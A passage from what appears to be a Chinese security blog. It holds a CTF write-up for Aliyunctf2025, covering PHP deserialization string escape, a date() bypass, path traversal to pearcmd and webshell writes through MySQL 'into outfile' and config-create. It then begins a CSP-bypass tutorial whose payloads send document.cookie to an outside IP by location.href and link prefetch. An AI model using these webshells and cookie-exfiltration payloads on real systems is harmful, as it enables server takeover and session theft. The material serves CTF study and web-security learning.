$this-\u0026gt;generateRandomString(); $salt = substr(md5($password), 0, 5); $password = md5($salt . $plain) . \u0026#39;:\u0026#39; . $salt; return $password; } } cache.php文件内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php class myCache { public function writecache($name,$data) { $file = \u0026#39;/var/www/html/cache/\u0026#39; . $name . \u0026#39;.php\u0026#39;; $cachedata = \u0026#34;\u0026lt;?php exit;//\u0026#34; . $data; file_put_contents($file,$cachedata); return \u0026#39;\u0026#39;; } } class checkin{ function writec($data,$name) { $wr=new myCache(); $wr-\u0026gt;writecache($data,$name); } } ?\u0026gt; 审计代码，可以发现在index.php文件中，存在一个文件包含的操作另一个php文件的操作。\n简单说说index.php文件逻辑，序列化操作，是序列化了一个数组，案后将其存放在一个文件中（集合index.php和cache.php文件来看），可以简单写一个代码来看一下写文件的内容是什么：\n1 2 3 4 5 6 7 \u0026lt;?php $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;\u0026#34;fupanc\u0026#34;,\u0026#34;reason\u0026#34;=\u0026gt;\u0026#34;123\u0026#34;,\u0026#34;time\u0026#34;=\u0026gt;\u0026#34;11112\u0026#34;,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $name=\u0026#34;fupanc\u0026#34;.\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;); $file = $name . \u0026#39;.php\u0026#39;; $cachedata = \u0026#34;\u0026lt;?php exit;//\u0026#34; . $arraya; file_put_contents($file,$cachedata); 文件fupanc-2025-02-23.php文件内容为：\n1 \u0026lt;?php exit;//a:4:{s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;fupanc\u0026#34;;s:6:\u0026#34;reason\u0026#34;;s:3:\u0026#34;123\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:2:\u0026#34;ok\u0026#34;;} 就是序列化数据，只是前面插入了一段php文件，估计是防止直接利用这个文件，死亡exit也绕不了，文件名不可控：\n1 $file = \u0026#39;/var/www/html/cache/\u0026#39; . $name . \u0026#39;.php\u0026#39;; 然后看其他index.php的其他代码，可以读出文件读取操作和反序列化操作，还有个字符串替换操作：\n1 2 3 4 5 6 7 $cachefile = \u0026#39;/var/www/html/cache/\u0026#39; . $_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;). \u0026#39;.php\u0026#39;; if (is_file($cachefile)) { $data=file_get_contents($cachefile); $checkdata = unserialize(str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data)); $check=\u0026#34;/var/www/html/\u0026#34;.$checkdata[\u0026#39;background\u0026#39;].\u0026#34;.php\u0026#34;; include \u0026#34;$check\u0026#34;; } 这里其实就是将插入的\u0026lt;?php exit;//替换为空，然后反序列化，就是反序列化为数组，然后读取数组中的内容，再包含它。从前面的序列化的代码可以看出，这里就是包含ok.php的内容，访问没有东西，还是直接看源码，得到如下内容：\n1 2 \u0026lt;?php echo \u0026#39;ok\u0026#39;;?\u0026gt; //adminer_481.php 访问就是mysql的连接操作：\n有点类似数据库操作的内容，但是这里就没获取到源码：\n在login.php文件中可以看到数据库名以及密码等信息，直接登录看看：\n可以查看数据库文件，以及可以执行sql语句。也尝试了into outfile和日志写马，但是都没有成功。应该是没有权限。\n再看index.php代码，在isset($_POST['reason'])的代码块中，这个time似乎是可控的：\n1 2 3 4 5 6 7 8 9 10 if(isset($_POST[\u0026#39;reason\u0026#39;])){ if(isset($_GET[\u0026#39;debug_buka\u0026#39;])) { $time=date($_GET[\u0026#39;debug_buka\u0026#39;]); }else{ $time=date(\u0026#34;Y-m-d H:i:s\u0026#34;); } $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;$_SESSION[\u0026#39;username\u0026#39;],\u0026#34;reason\u0026#34;=\u0026gt;$_POST[\u0026#39;reason\u0026#39;],\u0026#34;time\u0026#34;=\u0026gt;$time,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $check-\u0026gt;writec($_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;),$arraya); } 那么是否可以打字符串逃逸呢，直接控制time的值为\u0026lt;?php exit;//的一部分，然后被替换为空，并且这里的reason变量也是可控的，这样的话就是打字符串逃逸（减少），然后包含其他文件，测试一下data函数的输出：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php $a=111; $b=\u0026#34;\u0026lt;?php exit;//\u0026#34;; echo date($a).PHP_EOL; echo date($b); //output: 111 \u0026lt;?Z08Z UTC20255228;// 不可控，打不了，date()函数会。\n还是需要打其他的方法。\n尝试一下root的一般的默认密码root，直接登进去了：\n成功执行命令：\n尝试写马：\n1 select \u0026#39;\u0026lt;?php echo 123; @eval($_POST[123]); ?\u0026gt;\u0026#39; into outfile \u0026#39;/var/www/html/shell.php\u0026#39; 成功执行:\n访问1.php，成功执行：\n得到flag:\n1 aliyunctf{a9d1e1d9-53d5-4d10-a96b-361d693fb502} ——————\n最后看了一下官方wp。上面的是当时打出来的非预期解法。下面来简单说说预期解是反序列化字符串逃逸打pearcmd文件包含，主要还是这里的date()函数的绕过，在前面的php测试代码中，可以看出来是有字母或其他符号，会杯输出为其他内容。但是这里可以使用反斜杠来绕过，测试代码如下：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php $a=111; $b=\u0026#34;\\\u0026lt;\\?\\p\\h\\p\\ \\\\e\\x\\i\\\\t\\;\\/\\/\u0026#34;; echo date($a).PHP_EOL; echo date($b); /*output: 111 \u0026lt;?php exit;// */ 由于php的特性，这里的\\e和\\t是一个特殊字符，所以多拿一个\\来将前面的给转义，让其不被解析为特殊字符。\n从输出结果可以看出来成功输出想要的内容。再加上前面说的time变量是可控的，再加上reason变量可控，这里尝试如下包含pearcmd文件内容，简单来构造一下：\n正常的内容大概如下：\n1 \u0026lt;?php exit;//a:4:{s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;fupanc\u0026#34;;s:6:\u0026#34;reason\u0026#34;;s:3:\u0026#34;123\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:2:\u0026#34;ok\u0026#34;;} 然后会将\u0026lt;?php exit;//替换为空，这里看一下怎么利用。基本思路就是将background里面对应的ok给删去，替换为pearcmd内容。\n看了一下，感觉这里是需要结合当时字符串增多的特性来使用的，就是反序列化时匹配到足够的字符，然后就不会再匹配后面的字符了,这里需要将\u0026quot;;s:4:\u0026quot;time\u0026quot;;s:5:\u0026quot;吞掉，然后马上将time的值给设置给指定的值，在吞掉结束后，马上匹配一个\u0026quot;+后续字符来构成一个完整的序列化字符串，然后这里的长度匹配如下：\n1 2 3 4 5 6 print(len(\u0026#39;\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;xxxxxxxx\u0026#39;)) a=\u0026#39;\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;}\u0026#39; print(len(\u0026#39;\u0026lt;?php exit;//\u0026#39;)) //output: 18 13 需要改成长度匹配，而整数倍，这里只能修改字符串长度，所以让如下即可：\n1 2 3 4 5 6 print(len(\u0026#39;\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;xxxxxxxx\u0026#39;)) a=\u0026#39;\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;}\u0026#39; print(len(\u0026#39;\u0026lt;?php exit;//\u0026#39;)) //output: 26 13 传参就如下传即可：\n1 xxxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;} 看看输出：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;\u0026#34;fupanc\u0026#34;,\u0026#34;reason\u0026#34;=\u0026gt;\u0026#34;\u0026lt;?php exit;//\u0026lt;?php exit;//\u0026#34;,\u0026#34;time\u0026#34;=\u0026gt;\u0026#39;xxxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;}\u0026#39;,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $name=\u0026#34;fupanc\u0026#34;.\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;); $file = $name . \u0026#39;.php\u0026#39;; $cachedata = \u0026#34;\u0026lt;?php exit;//\u0026#34; . $arraya; file_put_contents($file,$cachedata); $data=file_get_contents($file); $b=str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data); echo $b; //output: a:4:{s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;fupanc\u0026#34;;s:6:\u0026#34;reason\u0026#34;;s:26:\u0026#34;\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:66:\u0026#34;xxxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;}\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:2:\u0026#34;ok\u0026#34;;} 在反序列化尝试时运行报错，再看，发现是长度出了问题，这里的time的长度为66，但是我原先测试的时候是设置为了一个长度为5的值，所以这里需要改一下长度，减少一个x即可，最后尝试如下：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;\u0026#34;fupanc\u0026#34;,\u0026#34;reason\u0026#34;=\u0026gt;\u0026#34;\u0026lt;?php exit;//\u0026lt;?php exit;//\u0026#34;,\u0026#34;time\u0026#34;=\u0026gt;\u0026#39;xxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;}\u0026#39;,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $name=\u0026#34;fupanc\u0026#34;.\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;); $file = $name . \u0026#39;.php\u0026#39;; $cachedata = \u0026#34;\u0026lt;?php exit;//\u0026#34; . $arraya; file_put_contents($file,$cachedata); $data=file_get_contents($file); $checkdata = unserialize(str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data)); echo $checkdata[\u0026#39;background\u0026#39;].\u0026#34;.php\u0026#34;; 输出为：\n1 pearcmd.php 成功了！，那么就可以打了，但是需要注意一下文件包含的路径，由于代码逻辑拼接了路径，所以需要进行目录穿越，最后的payload如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;\u0026#34;fupanc\u0026#34;,\u0026#34;reason\u0026#34;=\u0026gt;\u0026#34;\u0026lt;?php exit;//\u0026lt;?php exit;//\u0026#34;,\u0026#34;time\u0026#34;=\u0026gt;\u0026#39;xxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:37:\u0026#34;../../../../usr/local/lib/php/pearcmd\u0026#34;;}\u0026#39;,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $name=\u0026#34;fupanc\u0026#34;.\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;); $file = $name . \u0026#39;.php\u0026#39;; $cachedata = \u0026#34;\u0026lt;?php exit;//\u0026#34; . $arraya; file_put_contents($file,$cachedata); $data=file_get_contents($file); $checkdata = unserialize(str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data)); echo $checkdata[\u0026#39;background\u0026#39;].\u0026#34;.php\u0026#34;; //output: ../../../../usr/local/lib/php/pearcmd.php 再简单进行一下预期解的做法：\n在login.php文件内容中可以看到登录以及存入数据库的逻辑，并且是直接写入web数据库的，直接连接即可，然后自己写一个就行了：\n1 2 3 4 \u0026lt;?php $code=2222; $password=\u0026#34;2222\u0026#34;; echo md5($code.$password).\u0026#39;:\u0026#39;.$code; 输出内容作为密码，然后建立数据：\n然后直接登录即可：username:fupanc password:2222 code:2222。\n这样就能够进入index.php页面进行文件包含了，为了能够控制date()函数传参，需要加一个\\，这里直接用脚本来分割：\n1 2 3 input_str = \u0026#39;xxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:37:\u0026#34;../../../../usr/local/lib/php/pearcmd\u0026#34;;}\u0026#39; output_str = \u0026#39;\u0026#39;.join([f\u0026#39;\\\\{c}\u0026#39; for c in input_str]) print(output_str) 得到：\n1 \\x\\x\\x\\x\\x\\x\\x\\\u0026#34;\\;\\s\\:\\4\\:\\\u0026#34;\\t\\i\\m\\e\\\u0026#34;\\;\\s\\:\\5\\:\\\u0026#34;\\1\\1\\1\\1\\2\\\u0026#34;\\;\\s\\:\\1\\0\\:\\\u0026#34;\\b\\a\\c\\k\\g\\r\\o\\u\\n\\d\\\u0026#34;\\;\\s\\:\\3\\7\\:\\\u0026#34;\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\u\\s\\r\\/\\l\\o\\c\\a\\l\\/\\l\\i\\b\\/\\p\\h\\p\\/\\p\\e\\a\\r\\c\\m\\d\\\u0026#34;\\;\\} 从代码逻辑中可以得到传两次，一次写入文件，一次读取为文件从而包含：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php include \u0026#39;./cache.php\u0026#39;; $check=new checkin(); if(isset($_POST[\u0026#39;reason\u0026#39;])){ if(isset($_GET[\u0026#39;debug_buka\u0026#39;])) { $time=date($_GET[\u0026#39;debug_buka\u0026#39;]); }else{ $time=date(\u0026#34;Y-m-d H:i:s\u0026#34;); } $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;$_SESSION[\u0026#39;username\u0026#39;],\u0026#34;reason\u0026#34;=\u0026gt;$_POST[\u0026#39;reason\u0026#39;],\u0026#34;time\u0026#34;=\u0026gt;$time,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $check-\u0026gt;writec($_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;),$arraya); } if(isset($_GET[\u0026#39;check\u0026#39;])){ $cachefile = \u0026#39;/var/www/html/cache/\u0026#39; . $_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;). \u0026#39;.php\u0026#39;; if (is_file($cachefile)) { $data=file_get_contents($cachefile); $checkdata = unserialize(str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data)); $check=\u0026#34;/var/www/html/\u0026#34;.$checkdata[\u0026#39;background\u0026#39;].\u0026#34;.php\u0026#34;; include \u0026#34;$check\u0026#34;; } } ?\u0026gt; 第一次传参如下：\n1 2 3 get传参：debug_buka=\\x\\x\\x\\x\\x\\x\\x\\\u0026#34;\\;\\s\\:\\4\\:\\\u0026#34;\\t\\i\\m\\e\\\u0026#34;\\;\\s\\:\\5\\:\\\u0026#34;\\1\\1\\1\\1\\2\\\u0026#34;\\;\\s\\:\\1\\0\\:\\\u0026#34;\\b\\a\\c\\k\\g\\r\\o\\u\\n\\d\\\u0026#34;\\;\\s\\:\\3\\7\\:\\\u0026#34;\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\u\\s\\r\\/\\l\\o\\c\\a\\l\\/\\l\\i\\b\\/\\p\\h\\p\\/\\p\\e\\a\\r\\c\\m\\d\\\u0026#34;\\;\\} post传参：reason=\u0026lt;?php exit;//\u0026lt;?php exit;// 有符号，注意url编码，如下:\n第二次传参：\n1 get传参：?+config-create+/\u0026amp;check=1\u0026amp;/\u0026lt;?=@eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt;+/var/www/html/1234.php 如下：\n这里简单注意一下格式吧，这个config-create不是有两种格式吗，另外一种格式只有官方wp那样可以写进去。\n最后进行命令执行即可：\n同样拿到flag。\n后面的两道java题打的时候没打出来，就后面学了再来复现吧。\nJtools Java Tools\n————————————\nEspresso Coffee Buy me a cup of Espresso Coffee plz! Here are some JDK download links you may need\nhttps://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-linux-amd64.tar.gz\nhttps://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-linux-aarch64.tar.gz\nhttps://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-macos-amd64.tar.gz\nhttps://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-macos-aarch64.tar.gz\nhttps://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-windows-amd64.zip\nhint：\nFocus on the fields of org.graalvm.continuations.ContinuationImpl.FrameRecord\nAbuse org.graalvm.continuations.ContinuationImpl#stackFrameHead =\u0026gt; Hijack the Control Flow =\u0026gt; \u0026ldquo;ROP\u0026rdquo;\nCommand Exec Gadget\nsun.print.UnixPrintJob\n————————\n官方wp：\nhttps://xz.aliyun.com/news/17029?time__1311=eqUxn7DQoYqGT4mqGXnjAD97YGOzO1tH4D\u0026u_atoken=fcc01ab1aceadb0f15326e34dbaa7b49\u0026u_asig=1a0c399b17406473291628172e011d\n","date":"2025-02-26T21:17:10+08:00","permalink":"https://fupanc-w1n.github.io/p/aliyunctf2025wp/","title":"Aliyunctf2025[WP]"},{"content":"CSP绕过 前面了解了一下HttpOnly，后面就没怎么再学习XSS的东西了，这里又遇到了这个，再来学习一下。\nCSP简介 内容安全策略（Content Security Policy）是一种用于缓解大部分类型的内容注入攻击的web应用技术，比如xss、数据注入等可实现数据窃取、网站破坏行为的安全问题。该策略可以通过设定规则，来限制浏览器只能加载和指定特定来源的资源，当有从非白名单允许的JS脚本出现在页面中，浏览器会阻止脚本的执行，可以有效减少XSS等攻击的风险。但是同样存在绕过手段。\nCSP可以分为如下两种：\nContent-Security-Policy： 通过响应头来设置，浏览器接收到这个头后，会立即执行策略。\nContent-Security-Policy-Report-Only： 同样的通过响应头来设置，这个表示不执行限制选项，只记录未违反限制的行为，并且必须与report-uri选项配合使用。简单来说，就是可以通过这个HTTP头部来设置规则，同时必须要设置报告的uri，当前端页面的加载违反规则，浏览器只会以JSON格式向URI发送报告，而不会限制。具体可以参考 《Content-Security-Policy-Report-Only》\nCSP策略的使用 简单说了一下CSP的分类，那么如何使用呢？可以通过如下两个方式：\nHTTP响应头，Content-Security-Policy响应头，也就是前面说的那个。\n直接通过网页前端的 \u0026lt;mata\u0026gt; 标签\n——————\n（1）常用的策略指令：\nscript-src：定义了页面中Javascript的有效来源 style-src：定义了页面中CSS样式的有效来源 img-src：定义了页面中图片和图标的有效来源 font-src：定义了字体加载的有效来源 connect-src：定义了请求，如XMLHttpRequest（AJAX请求）、WebSocket和EventSource的连接来源。 child-src：定义了web workers以及嵌套的浏览上下文（如\u0026lt;frame\u0026gt;和\u0026lt;iframe\u0026gt;）的源。 object-src：限制可以加载哪些插件（例如Flash、XSS等） default-src：定义那些没有被更精确指令指定的安全策略，也就是上面说的那些等，但是也有的指令不会被指定，比如base-uri，这个在后面的CSP绕过会说。 （2）内容源的几点说明：\n其实就是取值，既然有有了指令，那么肯定要有指令内容，这里简单说几个：\n1 2 3 4 5 6 7 8 9 * : 星号表示允许任何URL资源，没有限制 \u0026#39;none\u0026#39;：表示不匹配任何资源 \u0026#39;self\u0026#39; 同源策略,即允许同域名同端口下,同协议下的请求 \u0026#39;unsafe-inline\u0026#39; 允许使用内联资源，也就是允许\u0026lt;script\u0026gt;等标签和事件监听函数的执行，一般不会使用 \u0026#39;unsafe-eval\u0026#39; 允许不安全的动态代码执行,如js中的eval() Function()等函数 https: 只允许通过https协议加载资源 nonce: 每次HTTP回应给出一个授权token,页面内嵌脚本必须有这个token,才会执行,设置值为：\u0026#39;nonce-12345678\u0026#39; 如下： \u0026lt;script nonce=\u0026#34;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=\u0026#34;\u0026gt;alert(123)\u0026lt;/script\u0026gt; 等，注意如上的单引号是必须的。其他的指令及内容参考：《CSP》\n最后简单看看如何设置，对于响应头，如下即可：\n1 header(\u0026#34;Content-Security-Policy: script-src \u0026#39;self\u0026#39;\u0026#34;); 对于前端的\u0026lt;meta\u0026gt;标签，直接在前端写就行了，一般是在 HTML 文档的 \u0026lt;head\u0026gt; 部分使用 \u0026lt;meta\u0026gt; 标签来定义（并且如果定义在\u0026lt;body\u0026gt;标签则会被浏览器忽略导致无法实施CSP），比如：\n1 \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;self\u0026#39; http://www.dlrb.com \u0026#39;unsafe-inline\u0026#39;\u0026#34; \u0026gt; 需要注意的是：\n在 HTTP 响应头中的 CSP 策略会对整个页面生效，包括内联脚本、内联样式以及外部资源的加载。\n\u0026lt;meta\u0026gt;标签设置的 CSP 策略仅对其之后的资源生效，而在 \u0026lt;meta\u0026gt; 标签之前存在内联脚本或样式，这些内联内容不会受到 CSP 策略的限制。因此应确保将其放置在 \u0026lt;head\u0026gt; 部分的最前面，以覆盖所有内联脚本和样式。\n简单本地测试代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script\u0026gt; // 内联脚本 1：此时 CSP 尚未生效 console.log(\u0026#34;内联脚本 1 执行\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;script-src \u0026#39;none\u0026#39;\u0026#34;\u0026gt; \u0026lt;script\u0026gt; // 内联脚本 2：CSP 已生效，执行会被阻止 console.log(\u0026#34;内联脚本 2 不会执行\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!--\u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;script-src \u0026#39;none\u0026#39;\u0026#34;\u0026gt;--\u0026gt; \u0026lt;script\u0026gt; // 内联脚本 3：CSP 已生效，执行会被阻止 console.log(\u0026#34;内联脚本 3 不会执行\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 可以改改看看前面的说明，完全正确。\nCSP绕过 如下是一个简单的留言框+CSP的前端页面，以这个代码来简单谈谈CSP绕过：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39; \u0026#39;nonce-2726c7f26c9\u0026#39;; style-src \u0026#39;self\u0026#39; https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src \u0026#39;self\u0026#39; data:; object-src \u0026#39;none\u0026#39;; base-uri \u0026#39;self\u0026#39;; form-action \u0026#39;self\u0026#39;\u0026#34;\u0026gt; \u0026lt;title\u0026gt;安全留言板\u0026lt;/title\u0026gt; \u0026lt;style nonce=\u0026#34;2726c7f26c9\u0026#34;\u0026gt; body { font-family: \u0026#39;Roboto\u0026#39;, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; } .container { background-color: #f5f5f5; padding: 20px; border-radius: 8px; } #messageInput { width: 70%; padding: 10px; margin-right: 10px; } button { padding: 10px 20px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; } .message-item { background-color: white; padding: 15px; margin: 10px 0; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); } \u0026lt;/style\u0026gt; \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css2?family=Roboto\u0026amp;display=swap\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;留言板\u0026lt;/h1\u0026gt; \u0026lt;form id=\u0026#34;messageForm\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;messageInput\u0026#34; placeholder=\u0026#34;输入你的留言...\u0026#34; required\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;提交\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div id=\u0026#34;messages\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script nonce=\u0026#34;2726c7f26c9\u0026#34;\u0026gt; document.getElementById(\u0026#39;messageForm\u0026#39;).addEventListener(\u0026#39;submit\u0026#39;, function(e) { e.preventDefault(); const messageInput = document.getElementById(\u0026#39;messageInput\u0026#39;); const message = messageInput.value.trim(); if (message) { const messageElement = document.createElement(\u0026#39;div\u0026#39;); messageElement.className = \u0026#39;message-item\u0026#39;; messageElement.textContent = message; // 使用textContent而不是innerHTML防止XSS document.getElementById(\u0026#39;messages\u0026#39;).appendChild(messageElement); messageInput.value = \u0026#39;\u0026#39;; } }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 简单解析一下：\ndefault-src 'self'：讲其他没设定的资源设置为同源。 script-src 'self' 'nonce-2726c7f26c9'：允许同源脚本，并且使用了nonce来允许特定内联脚本。 这里有个需要说明一下，看后面的\u0026lt;style\u0026gt;等标签，都是设置了内联token的，这里我们可以通过动态的设置这个token，来达到是否执行这个脚本的问题，在这个前端中，是直接通过\u0026lt;meta\u0026gt;标签来设置的，同样的，动态的话还可以通过HTTP响应头来设置.可以简单改改前面的前端脚本来自己理解一下。\nstyle-src 'self' https://fonts.googleapis.com：允许同源样式和Google Fonts的样式 font-src https://fonts.gstatic.com：允许从Google字体服务器加载字体。 img-src 'self' data:：允许同源图片和data URL图片 object-src 'none'：禁用所有插件内容 form-action 'self'：限制表单只能提交到同源地址 注意：如果设置了多个条件，只需要满足其中一个条件就会允许匹配，两个条件是独立的。\n这里的js代码也是比较也有点意思，是将留言的内容写入到DOM树的，通过Javascript来动态加载的，直接看ctrl+u是看不到的，可以去搭个前端了解一下。\n看了上面的代码，会对CSP的限制会更加清楚，如下说明一下绕过方法。\n绕过手段 这里就说说一下比较有意思的点。\n可以动态执行任意js脚本 当然是存在CSP限制啦，只不过设置的csp为script-src 'unsafe-inline'，也就是允许\u0026lt;script\u0026gt;标签的执行。\n这个绕过方法个人感觉其实不常见，都能随便执行js脚本了。\nlocation.href CSP不影响location.href跳转，直接如下打即可：\n1 2 3 \u0026lt;script\u0026gt; location.href = \u0026#34;http://47.100.223.173:2333?\u0026#34;+document.cookie ;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; location.href = \u0026#34;http://47.100.223.173:2333?\u0026#34;+escape(document.cookie);\u0026lt;/script\u0026gt; link标签的利用 老版本的浏览器可用，当时没有被\u0026lt;meta\u0026gt;标签约束，算是漏掉的，已经被修复了。\n硬写如下：\n1 \u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;//47.100.223.173:2333?${cookie}\u0026#34;\u0026gt; 辩证看待吧，带不出cookie，可能是cookie获取的错误。反正能访问到ip。\n通过js代码如下实现:\n1 2 3 4 \u0026lt;script\u0026gt;var link = document.createElement(\u0026#34;link\u0026#34;); link.setAttribute(\u0026#34;rel\u0026#34;, \u0026#34;prefetch\u0026#34;); link.setAttribute(\u0026#34;href\u0026#34;, \u0026#34;//47.100.223.173:2333/?\u0026#34; + document.cookie); document.head.appendChild(link);\u0026lt;/script\u0026gt; 这样的js代码代码是成功带出来cookie的。\n但是限制都比较大，需要可以执行任意JS脚本。\n其他绕过方法 使用iframe标签绕过 所有的主流浏览器都支持\u0026lt;iframe\u0026gt;标签，这个标签的定义就是规定了一个内联框架，也就是它能够将另一个HTML页面嵌入到当前页面中。\n也就是说，可以怎么办，如果我们能够控制当前的web服务中的一个页面的内容，而另外一个页面是有我想要的东西的，此时我们就可以尝试在能控制得页面中使用iframe标签来嵌入另一个页面，然后将其打印处理啊，这样就能成功绕过CSP的同源限制得到想要得东西了\n一个简单的示例：\n以原先的留言板的代码为例：\napp.html：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src 